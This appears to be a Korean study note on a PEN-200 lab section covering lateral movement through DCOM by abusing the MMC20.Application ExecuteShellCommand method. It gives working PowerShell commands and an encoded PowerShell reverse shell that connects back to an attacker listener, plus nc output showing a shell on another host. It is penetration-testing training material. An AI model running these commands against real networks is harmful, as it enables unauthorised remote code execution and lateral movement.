# 24.1.6 DCOM

> **DCOM** · PEN-200 §24.1.6

COM(Component Object Model)은 소프트웨어 구성요소가 서로 상호작용하게 하는 Windows 의 오래된 체계임. 원래 동일 프로세스·프로세스 간 통신용이었는데, 이를 **네트워크 너머 여러 컴퓨터 사이로 확장한 것이 DCOM** 임.

- 통신은 **RPC over TCP 135**
- DCOM Service Control Manager(사실상 API)를 호출하려면 **로컬 관리자 권한 필요**

이 절이 다루는 것은 Matt Nelson 이 발견하고 Cybereason 이 정리한 기법 하나로, **MMC(Microsoft Management Console) COM 애플리케이션**을 악용함. MMC Application Class 는 Application Object 를 만들 수 있게 하고, 그 객체의 `Document.ActiveView` 속성 아래에 **`ExecuteShellCommand` 메서드**가 노출됨. 이름 그대로 임의의 셸 명령을 실행하며, **로컬 관리자에게는 기본적으로 허용돼 있음** — 이것이 성립 근거임.

권한 상승된 PowerShell 에서 `GetTypeFromProgID` 의 **두 번째 인자에 대상 IP** 를 주면 원격 MMC 2.0 애플리케이션 객체가 만들어짐.

```
$dcom =
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","19
2.168.50.73"))
```

`ExecuteShellCommand` 는 인자 넷 — `Command`, `Directory`, `Parameters`, `WindowState` 를 받음. 실제로 필요한 것은 첫째와 셋째뿐이고, 나머지는 `$null` 과 임의값으로 채움.

```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

⚠️ **생성된 프로세스는 session 0 에 뜸.** 화면에 아무것도 안 나타나므로 실패로 오독하기 쉬움 — 확인은 대상에서 `tasklist` 로 할 것.

```
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K
```

여기까지가 코드 실행 증명이고, 실전에서는 페이로드를 WMI 절에서 만든 **base64 인코딩 리버스셸**로 갈아끼움. 세 번째 인자(`Parameters`)에 통째로 넣음.

```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w
hidden -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

리스너를 미리 띄워두면 대상 호스트에서 셸이 돌아옴 — MMC DCOM 애플리케이션 악용만으로 내부 호스트 하나를 추가로 확보하는 것임.

```
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04
```

`[가정]` PsExec 과 달리 디스크에 바이너리를 떨어뜨리거나 서비스를 만드는 단계가 없어 탐지 관점에서 조용할 것으로 보이나, 교재가 명시한 내용은 아님.
